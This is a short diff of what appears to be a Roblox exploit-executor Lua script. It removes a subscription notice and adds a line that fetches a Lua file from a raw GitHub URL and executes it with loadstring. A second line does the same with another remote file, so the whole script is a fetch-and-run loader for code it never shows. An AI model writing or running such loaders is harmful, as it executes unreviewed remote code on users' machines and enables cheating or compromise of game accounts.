@@ -1,7 +1,3 @@
-game.StarterGui:SetCore("SendNotification", {
-    Title = "Notice",
-    Text = "Subscribed for 3 days to work",
-    Duration = 5
-})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iwantsom3/script/refs/heads/main/Sksjs.lua"))()
 wait(1)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/PlsNoNoob/-/refs/heads/main/Loadload.lua'))()
